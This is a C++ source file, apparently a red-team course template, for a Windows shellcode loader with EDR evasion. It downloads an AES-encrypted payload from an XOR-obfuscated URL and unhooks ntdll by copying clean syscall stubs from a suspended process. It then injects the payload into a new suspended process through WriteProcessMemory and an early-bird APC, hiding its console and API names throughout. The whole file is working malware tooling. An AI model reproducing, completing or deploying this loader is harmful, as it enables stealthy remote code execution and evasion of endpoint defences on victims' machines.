/*

 Red Team Operator course code template
 Perun's Fart - unhooking ntdll w/o reading disk
 
 author: reenz0h (twitter: @SEKTOR7net)

 Http staging: MalDev Academy
 Useless shit: assume-breach
*/
#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <psapi.h>
#include <wininet.h>
#include <ntstatus.h>
#include <iostream>

#pragma comment(lib, "wininet.lib")
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

NTSTATUS status;

typedef NTSTATUS (NTAPI *PNTQUEUEAPCTHREAD)(
    HANDLE ThreadHandle,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcRoutineContext,
    PIO_STATUS_BLOCK ApcStatusBlock,
    ULONG ApcReserved
    );

typedef VOID (NTAPI *PIO_APC_ROUTINE)(
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    ULONG Reserved
);
typedef NTSTATUS(NTAPI *NtWriteVirtualMemoryPtr)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten OPTIONAL
);

typedef BOOL (WINAPI *PWRITEPROCESSMEMORY)(
    HANDLE hProcess,
    LPVOID lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T nSize,
    SIZE_T *lpNumberOfBytesWritten
);


// Declaration for NtProtectVirtualMemory
typedef NTSTATUS(NTAPI* pfnNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

// Declaration for RtlCopyMemory
typedef VOID(NTAPI* pfnRtlCopyMemory)(
    PVOID Destination,
    CONST VOID* Source,
    SIZE_T Length
);

typedef NTSTATUS(WINAPI* fnNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

extern "C" NTSTATUS NTAPI NtFreeVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG FreeType
);

extern "C" NTSTATUS NTAPI NtAllocateVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN ULONG_PTR ZeroBits,
    IN OUT PSIZE_T RegionSize,
    IN ULONG AllocationType,
    IN ULONG Protect
);

extern "C" NTSTATUS NTAPI NtCreateThreadEx(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument,
    IN ULONG CreateFlags,
    IN SIZE_T ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    OUT PVOID AttributeList
);

typedef NTSTATUS(NTAPI* pfnNtCreateProcess)(
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN HANDLE ParentProcess,
    IN BOOLEAN InheritObjectTable,
    IN HANDLE SectionHandle OPTIONAL,
    IN HANDLE DebugPort OPTIONAL,
    IN HANDLE ExceptionPort OPTIONAL
    );

typedef HANDLE(WINAPI* fnCreateToolhelp32Snapshot)(
    DWORD dwFlags,
    DWORD th32ProcessID
);

typedef BOOL(WINAPI* fnProcess32First)(
    HANDLE hSnapshot,
    LPPROCESSENTRY32 lppe
);

typedef BOOL(WINAPI* fnProcess32Next)(
    HANDLE hSnapshot,
    LPPROCESSENTRY32 lppe
);

typedef BOOL(WINAPI* fnCloseHandle)(
    HANDLE hObject
);

typedef NTSTATUS (NTAPI *PFN_NTCLOSE)(
    HANDLE Handle
);


unsigned char RandomG[] = KEYVALUE

unsigned char RandomJ[] = { 'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 0x0 };
unsigned char Random1[] = { 'N', 't', 'D', 'e', 'l', 'a', 'y', 'E', 'x', 'e', 'c', 'u', 't', 'i', 'o', 'n', 0x0 };
unsigned char Random2[] = { 'Z', 'w', 'S', 'e', 't', 'T', 'i', 'm', 'e', 'r', 'R', 'e', 's', 'o', 'l', 'u', 't', 'i', 'o', 'n', 0x0 };
unsigned char Random3[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
unsigned char Random4[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
unsigned char RandomL[] = { 'C', 'r', 'e', 'a', 't', 'e', 'T', 'o', 'o', 'l', 'h', 'e', 'l', 'p', '3', '2', 'S', 'n', 'a', 'p', 's', 'h', 'o', 't', 0x0 };
unsigned char RandomM[] = { 'P', 'r', 'o', 'c', 'e', 's', 's', '3', '2', 'F', 'i', 'r', 's', 't', 0x0 };
unsigned char RandomN[] = { 'N','t','C', 'l', 'o', 's', 'e', 0x0 };
INJ3CT
SPAWN



typedef FARPROC(__stdcall* ARPROC)(HMODULE, LPCSTR);

FARPROC Random5(HMODULE hModule, LPCSTR lpProcName) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule +
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfFunctions);
    WORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule + exportDirectory->AddressOfNameOrdinals);
    DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfNames);

    for (DWORD i = 0; i < exportDirectory->NumberOfNames; ++i) {
        if (strcmp(lpProcName, (const char*)hModule + addressOfNames[i]) == 0) {
            return (FARPROC)((BYTE*)hModule + addressOfFunctions[addressOfNameOrdinals[i]]);
        }
    }

    return NULL;
}

// Function to get the address of NT APIs from kernel32.dll
fnCreateToolhelp32Snapshot NtCreateToolhelp32Snapshot_p =
    (fnCreateToolhelp32Snapshot)Random5(GetModuleHandleA(Random4), RandomL);

fnProcess32First NtProcess32First_p =
    (fnProcess32First)Random5(GetModuleHandleA(Random4), RandomM);

fnProcess32Next NtProcess32Next_p =
    (fnProcess32Next)Random5(GetModuleHandleA(Random4), "Process32Next");

PFN_NTCLOSE NtClose_p =
    (PFN_NTCLOSE)Random5(GetModuleHandleA(Random3), RandomN);

pfnNtProtectVirtualMemory NtProtectVirtualMemory_p = (pfnNtProtectVirtualMemory)Random5(GetModuleHandle(Random3), "NtProtectVirtualMemory");


pfnRtlCopyMemory RtlCopyMemory = (pfnRtlCopyMemory)Random5(GetModuleHandle(Random3), "RtlCopyMemory");


static NTSTATUS(__stdcall *NtDelayExecution)(BOOL Alertable, PLARGE_INTEGER DelayInterval) = (NTSTATUS(__stdcall*)(BOOL, PLARGE_INTEGER)) Random5(GetModuleHandle(Random3), Random1);

static NTSTATUS(__stdcall *ZwSetTimerResolution)(IN ULONG RequestedResolution, IN BOOLEAN Set, OUT PULONG ActualResolution) = (NTSTATUS(__stdcall*)(ULONG, BOOLEAN, PULONG)) Random5(GetModuleHandle(Random3), Random2);



static void Random6(float milliseconds) {
    static bool once = true;
    if (once) {
        ULONG actualResolution;
        ZwSetTimerResolution(1, true, &actualResolution);
        once = false;
    }

    LARGE_INTEGER interval;
    interval.QuadPart = -1 * (int)(milliseconds * 10000.0f);
    NtDelayExecution(false, &interval);
}


BOOL Random7(LPCWSTR szUrl, PBYTE* Random8, SIZE_T* pBufferSize) {
    BOOL bSuccess = TRUE;
    HINTERNET hInternet = NULL;
    HINTERNET hUrl = NULL;
    SIZE_T totalSize = 0;
    PBYTE pBuffer = NULL;
    PBYTE pTempBuffer = NULL;
    DWORD bytesRead = 0;

    // Open Internet session handle
    hInternet = InternetOpenW(L"Microsoft", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        wprintf(L"[!] InternetOpenW Failed With Error : %d \n", GetLastError());
        bSuccess = FALSE;
        goto _EndOfFunction;
    }

    // Open handle to the Random8 using the Random8's URL
    hUrl = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    if (hUrl == NULL) {
        wprintf(L"[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
        bSuccess = FALSE;
        goto _EndOfFunction;
    }

    // Allocate 1024 bytes for the temp buffer
    pTempBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024);
    if (pTempBuffer == NULL) {
        bSuccess = FALSE;
        goto _EndOfFunction;
    }

    while (TRUE) {
        // Read 1024 bytes to the temp buffer
        if (!InternetReadFile(hUrl, pTempBuffer, 1024, &bytesRead)) {
            wprintf(L"[!] InternetReadFile Failed With Error : %d \n", GetLastError());
            bSuccess = FALSE;
            goto _EndOfFunction;
        }

        // Calculate the total size of the buffer
        totalSize += bytesRead;

        // If the total buffer is not allocated yet, allocate it
        if (pBuffer == NULL)
            pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, totalSize);
        else
            pBuffer = (PBYTE)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pBuffer, totalSize);

        if (pBuffer == NULL) {
            bSuccess = FALSE;
            goto _EndOfFunction;
        }

        // Append the temp buffer to the end of the total buffer
        memcpy(pBuffer + (totalSize - bytesRead), pTempBuffer, bytesRead);

        // Clean up the temp buffer
        memset(pTempBuffer, 0, bytesRead);

        // If less than 1024 bytes were read, exit the loop
        if (bytesRead < 1024) {
            break;
        }
    }

    // Save results
    *Random8 = pBuffer;
    *pBufferSize = totalSize;

_EndOfFunction:
    // Cleanup
    if (hInternet) InternetCloseHandle(hInternet);
    if (hUrl) InternetCloseHandle(hUrl);

    return bSuccess;
}

int RandomC(char * Random8, int Random9, unsigned char * RandomG, size_t RandomH) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return -1;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        return -1;
    }
    if (!CryptHashData(hHash, RandomG, (DWORD)RandomH, 0)) {
        return -1;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        return -1;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE *)Random8, (DWORD *)&Random9)) {
        return -1;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}


int RandomA(const char* procname) {
    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    // Create snapshot of processes using NtCreateToolhelp32Snapshot
    hProcSnap = NtCreateToolhelp32Snapshot_p(TH32CS_SNAPPROCESS, 0);
    if (hProcSnap == INVALID_HANDLE_VALUE) return 0;

    //printf("snapshot taken! %x\n", hProcSnap);
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Get information about the first process
    if (!NtProcess32First_p(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }

    //printf("going thru snapshot!\n");

    // Iterate through processes
    while (NtProcess32Next_p(hProcSnap, &pe32)) {
        //printf("Found: %30s\n", pe32.szExeFile);
        if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }

    NtClose_p(hProcSnap);

    return pid;
}

int RandomD(char * pMem, DWORD size){
	
	// gets the first byte of first syscall
	DWORD i = 0;
	DWORD offset = 0;
	BYTE pattern1[] = "\x0f\x05\xc3";  // syscall ; ret
	BYTE pattern2[] = "\xcc\xcc\xcc";  // int3 * 3
	
	// find first occurance of syscall+ret instructions
	for (i = 0; i < size - 3; i++) {
		if (!memcmp(pMem + i, pattern1, 3)) {
			offset = i;
			break;
		}
	}		
	
	// now find the beginning of the syscall
	for (i = 3; i < 50 ; i++) {
		if (!memcmp(pMem + offset - i, pattern2, 3)) {
			offset = offset - i + 3;
			//printf("First syscall found at 0x%p\n", pMem + offset);
			break;
		}		
	}

	return offset;
}


int RandomE(char * pMem, DWORD size) {

	// returns the last byte of the last syscall
	DWORD i;
	DWORD offset = 0;
	BYTE pattern[] = "\x0f\x05\xc3\xcd\x2e\xc3\xcc\xcc\xcc";  // syscall ; ret ; int 2e ; ret ; int3 * 3
	
	// backwards lookup
	for (i = size - 9; i > 0; i--) {
		if (!memcmp(pMem + i, pattern, 9)) {
			offset = i + 6;
			//printf("Last syscall byte found at 0x%p\n", pMem + offset);
			break;
		}
	}		
	
	return offset;
}
		


static int RandomF(const HMODULE hNtdll, const LPVOID pCache) {
    DWORD oldProtect = 0;
    PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER)pCache;
    PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR)pCache + pImgDOSHead->e_lfanew);
    int i;

    NTSTATUS status = 0;  // Declare status before the loop

    // Find .text section
    for (i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        Random6(3500);

        if (!strcmp((char *)pImgSectionHead->Name, ".text")) {
            // Prepare ntdll.dll memory region for write permissions.
            SIZE_T regionSize = pImgSectionHead->Misc.VirtualSize;
            PVOID baseAddress = (PVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress);

            status = NtProtectVirtualMemory_p(GetCurrentProcess(), &baseAddress, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);

            if (!NT_SUCCESS(status)) {
                // RWX failed!
                return -1;
            }

            // Copy clean "syscall table" into ntdll memory
            DWORD SC_start = RandomD((char *)pCache, pImgSectionHead->Misc.VirtualSize);
            DWORD SC_end = RandomE((char *)pCache, pImgSectionHead->Misc.VirtualSize);

            if (SC_start != 0 && SC_end != 0 && SC_start < SC_end) {
                DWORD SC_size = SC_end - SC_start;
             //   printf("dst (in ntdll): %p\n", ((DWORD_PTR)hNtdll + SC_start));
             //   printf("src (in cache): %p\n", ((DWORD_PTR)pCache + SC_start));
             //   printf("size: %i\n", SC_size);
             //   getchar();

                // Use RtlCopyMemory instead of memcpy
                RtlCopyMemory((LPVOID)((DWORD_PTR)hNtdll + SC_start),
                              (LPVOID)((DWORD_PTR)pCache + SC_start),
                              SC_size);
            }

            // Restore original protection settings of ntdll
            status = NtProtectVirtualMemory_p(GetCurrentProcess(), &baseAddress, &regionSize, oldProtect, &oldProtect);

            if (!NT_SUCCESS(status)) {
                // It failed
                return -1;
            }

            return 0;
        }
    }

    // Failed? .text not found!
    return -1;
}

DWORD RandomO(const char * pName) {
	PROCESSENTRY32 pEntry;
	HANDLE snapshot;

	pEntry.dwSize = sizeof(PROCESSENTRY32);
    snapshot = NtCreateToolhelp32Snapshot_p(TH32CS_SNAPPROCESS, 0);


	if (Process32First(snapshot, &pEntry) == TRUE) {
		while (Process32Next(snapshot, &pEntry) == TRUE) {
			if (_stricmp(pEntry.szExeFile, pName) == 0) {
				return pEntry.th32ProcessID;
			}
		}
	}
	CloseHandle(snapshot);
	return 0;
}

char RandomT[] = "XKEYVAL"; 

void RandomS(char* data, size_t data_len, char* RandomT, size_t RandomT_len) {
    int j;

    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == RandomT_len - 1) j = 0;

        data[i] = data[i] ^ RandomT[j];
        j++;
    }
}

unsigned char RandomR[] = WEBSITE

int main(void) {
    int pid = 0;
    HANDLE hProc = NULL;
    int ret = 0;
    void* RandomP;
    RandomS((char*)RandomR, sizeof(RandomR), RandomT, sizeof(RandomT));

    // Convert URL array to a wide-character string
    int wideLen = MultiByteToWideChar(CP_ACP, 0, (LPCCH)RandomR, -1, NULL, 0);
    wchar_t* wideRandomR = new wchar_t[wideLen];
    MultiByteToWideChar(CP_ACP, 0, (LPCCH)RandomR, -1, wideRandomR, wideLen);

    LPCWSTR szUrl = wideRandomR; // Now szUrl can be used as LPCWSTR

    // Example of using szUrl
    //std::wcout << L"URL: " << szUrl << std::endl;

    PBYTE Random8;
    SIZE_T Random9 = 0;
    FreeConsole();
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    Random6(3500);


if (!Random7(szUrl, &Random8, &Random9)) {
        printf("[!] Random3 Failed\n");
        return 1;
    }


	BOOL success = CreateProcessA(
		NULL, 
		(LPSTR) RandomH, 
		NULL, 
		NULL, 
		FALSE, 
		CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
		//CREATE_NEW_CONSOLE,
		NULL, 
		RandomJ, 
		&si, 
		&pi);

	if (success == FALSE) {
		printf("[!] Error: Could not call CreateProcess\n");
		return 1;
	}	

  
char * pNtdllAddr = (char *)GetModuleHandle(Random3);
IMAGE_DOS_HEADER * pDosHdr = (IMAGE_DOS_HEADER *)pNtdllAddr;
IMAGE_NT_HEADERS * pNTHdr = (IMAGE_NT_HEADERS *)(pNtdllAddr + pDosHdr->e_lfanew);
IMAGE_OPTIONAL_HEADER * pOptionalHdr = &pNTHdr->OptionalHeader;

SIZE_T ntdll_size = pOptionalHdr->SizeOfImage;

PVOID pCache = nullptr;
SIZE_T regionSize = ntdll_size;

// Allocate memory using NtAllocateVirtualMemory
NTSTATUS status = NtAllocateVirtualMemory(
    GetCurrentProcess(), &pCache, 0, &regionSize,
    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
);

if (!NT_SUCCESS(status)) {
    printf("[!] Error: Memory allocation failed (NTStatus: %lx)\n", status);
    return 1;
}

	Random6(3500);
	SIZE_T bytesRead = 0;
	if (!ReadProcessMemory(pi.hProcess, pNtdllAddr, pCache, ntdll_size, &bytesRead))
		
	TerminateProcess(pi.hProcess, 0);
	

    Random6(1000);
    ResumeThread(pi.hThread);

    ret = RandomF(GetModuleHandle((LPCSTR)Random3), pCache);
    Random6(1500);

pid = RandomA(RandomK);

 ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );
    
  BOOL successes = CreateProcessA(
    NULL, 
    (LPSTR) RandomK, 
    NULL, 
    NULL, 
    FALSE, 
    CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
    NULL, 
    NULL,  
    &si, 
    &pi
);

if (!successes) {
    printf("CreateProcess failed (%lu)\n", GetLastError());
    return 1;
}
	RandomC((BYTE*) Random8, Random9, (char *) RandomG, sizeof(RandomG));	

	RandomP = VirtualAllocEx(pi.hProcess, NULL, Random9, MEM_COMMIT, PAGE_EXECUTE_READ);

	Random6(1000);
   
   PWRITEPROCESSMEMORY pWriteProcessMemory = (PWRITEPROCESSMEMORY)Random5(
        GetModuleHandle(Random4),
        "WriteProcessMemory"
    );

    if (pWriteProcessMemory != NULL) {
        // Define your parameters
        HANDLE hProcess = pi.hProcess;  
        LPVOID lpBaseAddress = RandomP;  
        LPCVOID lpBuffer = Random8;  
        SIZE_T nSize = Random9;  
        SIZE_T lpNumberOfBytesWritten;


        BOOL success = pWriteProcessMemory(
            hProcess,
            lpBaseAddress,
            lpBuffer,
            nSize,
            &lpNumberOfBytesWritten
        );


        if (success) {

        } else {

        }
    } else {

    }

	Random6(1000);
PNTQUEUEAPCTHREAD NtQueueApcThread = (PNTQUEUEAPCTHREAD)Random5(
    GetModuleHandle(Random3),
    "NtQueueApcThread"
);

if (NtQueueApcThread != NULL) {
    // Now call the function using the obtained function pointer
    NTSTATUS status = NtQueueApcThread(
        pi.hThread,     // Thread handle
        (PIO_APC_ROUTINE)RandomP,  // APC routine
        NULL,           // APC routine context
        NULL,           // Status block (optional)
        0               // Reserved (should be zero)
    );
   }

    Random6(1000);

	ResumeThread(pi.hThread);

	return 0;
}
